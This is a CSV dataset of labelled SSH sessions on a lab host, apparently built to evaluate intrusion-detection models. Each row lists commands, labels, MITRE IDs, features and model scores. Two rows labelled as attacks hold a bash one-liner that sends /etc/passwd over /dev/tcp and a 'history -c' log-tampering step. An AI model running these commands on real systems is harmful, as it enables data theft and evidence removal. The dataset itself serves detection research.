session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,scenario,expected_rule_ids,mitre,source,split,persona,session_tag,composition,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,fail_ratio,commands_denied,fired_rule_ids,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy,cmd_oov_rate,cmd_mean_surprisal,cmd_max_surprisal,cmd_mean_novelty,cmd_max_novelty,randomforest_score,randomforest_pred,lightgbm_score,lightgbm_pred
19fdc3a5376060cd000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:25.126+0000,2026-08-07T12:05:28.878+0000,3,False,False,False,"['echo TAG:atk_log_tamper_46d176', 'ls -la /var/log/', 'cat /var/log/auth.log 2>/dev/null | tail -20', 'history -c', 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,attack,['log_tamper'],log_tamper,[100516],"['T1070', 'T1562']",real,eval,,atk_log_tamper_46d176,full,False,False,False,0.0,[],"[100500, 100502, 100503, 100516, 100518]",SSH,1,2026-08-07 12:05:25.126000+00:00,2026-08-07 12:05:28.878000+00:00,3.0,12,0,0,4,1.0,18.5,2.0,0,0,0,1,1,0,0,0,0,1,1,0.0,0.75,14.189450198206906,16.379006001888587,0.3196873546295433,0.5134434321162373,0.9773977272727272,1,0.9999997773293777,1
19fdc3a6a1325666000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:31.132+0000,2026-08-07T12:05:42.128+0000,11,False,False,False,"['echo TAG:ben_dba_c4c77c', 'du -ah --exclude=""/tmp""', 'du -ah --exclude=""/tmp""', ""grep -r 'panic' /var/log"", ""grep -l 'kernel' *.log"", ""grep '^$' file.txt"", 'du -B 512G', ""grep 'error' log.txt"", ""grep 'def' *.py"", 'df', 'du -B 5G', 'df -h --output=used', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dba,[],[],real,eval,dba,ben_dba_c4c77c,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:05:31.132000+00:00,2026-08-07 12:05:42.128000+00:00,11.0,12,0,0,11,0.9090909090909092,16.727272727272727,3.277613436819116,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.635126143686684,10.312916811430814,0.0,3.3306690738754696e-16,0.0,0,1.4957887598667526e-07,0
19fdc3aa57965ffc000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:46.199+0000,2026-08-07T12:05:54.879+0000,8,False,False,False,"[""grep '[0-9]' file.txt"", 'echo TAG:ben_dba_1a1ce5', ""grep '[0-9]' file.txt"", ""grep '[0-9]' file.txt"", 'cat < file.txt', 'cat -n file.txt', ""grep '[0-9]' file.txt"", 'du -S', ""grep '[0-9]' file.txt"", 'du -B 4P', ""grep 'home' /etc/fstab"", 'du --time=ctime', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dba,[],[],real,eval,dba,ben_dba_1a1ce5,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:05:46.199000+00:00,2026-08-07 12:05:54.879000+00:00,8.0,12,0,0,11,0.6363636363636364,16.727272727272727,2.40400975732486,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.460242537532752,10.356638188860131,1.4130111222501992e-16,5.551115123125784e-16,0.0,0,1.3792732374733806e-07,0
19fdc3ad3cecf843000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:58.128+0000,2026-08-07T12:06:05.377+0000,7,False,False,False,"['echo TAG:ben_auditor_fc7bff', 'ls -latu', 'ls -d */', 'cat /dev/urandom | head -c 16', 'ls -latu', 'find /data -path ""*/.bak"" -prune -o -type f -print', 'find /home -maxdepth 1 -type d', 'ls -RF', ""grep 'Failed login' /var/log/auth.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_fc7bff,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:05:58.128000+00:00,2026-08-07 12:06:05.377000+00:00,7.0,12,0,0,8,0.875,22.0,2.75,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.45710914858709,10.40172607838867,-1.3877787807814454e-16,5.551115123125784e-16,0.0,0,1.3792732374731774e-07,0
19fdc3affe32c637000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:09.264+0000,2026-08-07T12:06:19.628+0000,10,False,False,False,"['echo TAG:ben_admin_6ea3bf', 'cd /var/lock', 'cd /var/lock', 'cd /usr/share/games', 'cd /usr/share/games', 'ls -ltur ~', 'cd /var/lock', 'ls -i', 'df -h --output=used', 'du -B 5G', 'cd /usr/share/games', 'ls -ltur ~', 'ls -lRt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",16,0,benign,[],admin,[],[],real,eval,admin,ben_admin_6ea3bf,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:06:09.264000+00:00,2026-08-07 12:06:19.628000+00:00,10.0,12,0,0,12,0.5833333333333334,12.666666666666666,2.6258145836939115,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,11.23916871617107,12.678566283747497,0.0,1.1102230246251563e-16,0.0,0,1.433722570719311e-07,0
19fdc3b332502419000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:22.484+0000,2026-08-07T12:06:26.625+0000,4,False,False,False,"['echo TAG:ben_admin_b6718e', 'du -ah | sort -hr', 'df -i', 'ls -v', 'ls -lh /', 'du -B 64M', 'du -B 128K', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],admin,[],[],real,eval,admin,ben_admin_b6718e,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:06:22.484000+00:00,2026-08-07 12:06:26.625000+00:00,4.0,12,0,0,6,1.0,9.0,2.584962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.414001048146403,10.764296157773378,-1.480297366166875e-16,0.0,0.0,0,1.3792732374733145e-07,0
19fdc3b4c33a7dd0000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:28.876+0000,2026-08-07T12:06:32.126+0000,3,False,False,False,"['echo TAG:atk_exfil_eec9c6', 'bash -c \'echo -e ""POST / HTTP/0.9\\n\\n$(</etc/passwd)"" >/dev/tcp/127.0.0.1/2222\'', ""df -h | awk '$5+0 < 20'"", 'ls -a ~', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",7,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_eec9c6,diluted,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:06:28.876000+00:00,2026-08-07 12:06:32.126000+00:00,3.0,12,0,0,3,1.0,36.333333333333336,1.584962500721156,1,0,0,0,0,0,0,0,0,1,1,0.0,0.3333333333333333,12.14242932304071,16.379006001888587,0.192809824243772,0.5784294727313154,0.9461845238095238,1,0.9999997944120057,1
19fdc3c8ff72e2b4000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:07:51.875+0000,2026-08-07T12:07:57.622+0000,5,False,False,False,"['echo TAG:ben_auditor_4aef1c', 'ls -ld /usr/*/', 'ls -ld /usr/*/', 'uptime', 'find /var/log -mtime -1', ""ls -l | grep '^l'"", 'ls -lF', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_4aef1c,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:07:51.875000+00:00,2026-08-07 12:07:57.622000+00:00,5.0,12,0,0,6,0.8333333333333334,13.333333333333334,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.377994233873324,10.651085547325389,-3.7007434154171876e-17,2.220446049250313e-16,0.0,0,1.3792732374732483e-07,0
19fdc3cb0090eeb1000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:07:59.873+0000,2026-08-07T12:08:05.827+0000,5,False,False,False,"['du -h', 'echo TAG:ben_dba_aa06b7', 'find /var -not -group wheel', 'du -ah --exclude=""/tmp""', 'du -ah /etc', ""grep -n 'main' main.c"", 'du -ah --exclude=""/tmp""', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,benign,[],dba,[],[],real,eval,dba,ben_dba_aa06b7,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:07:59.873000+00:00,2026-08-07 12:08:05.827000+00:00,5.0,12,0,0,6,0.8333333333333334,18.33333333333333,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.103034528884317,11.24972298494362,9.251858538542972e-17,4.440892098500626e-16,0.0,0,1.3792732374732483e-07,0
19fdc3cd687b0501000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:09.808+0000,2026-08-07T12:08:13.873+0000,3,False,False,False,"['echo TAG:ben_dba_4ad295', 'du -B 256K', ""grep '^#' script.sh"", 'df -h --output=source,fstype,pcent', 'df -h --output=source,fstype,pcent', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,benign,[],dba,[],[],real,eval,dba,ben_dba_4ad295,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:08:09.808000+00:00,2026-08-07 12:08:13.873000+00:00,3.0,12,0,0,4,0.75,24.25,1.5,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.724334990950572,10.764296157773378,-3.8857805861880484e-16,0.0,0.0,0,1.379273237473317e-07,0
19fdc3cf2e61514d000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:16.998+0000,2026-08-07T12:08:25.623+0000,8,False,False,False,"['echo TAG:ben_auditor_4c70e4', 'ls -lRh ~', 'cat -n file.txt', 'ls -lR', 'cat -n file.txt', 'cat -n file.txt', 'cat -n file.txt', 'find /tmp -maxdepth 1 -type f', ""grep 'Failed login' /var/log/auth.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_4c70e4,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:08:16.998000+00:00,2026-08-07 12:08:25.623000+00:00,8.0,12,0,0,8,0.625,17.625,2.0,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.321637959579943,10.03915599900396,1.3877787807814454e-16,5.551115123125784e-16,0.0,0,1.379273237473349e-07,0
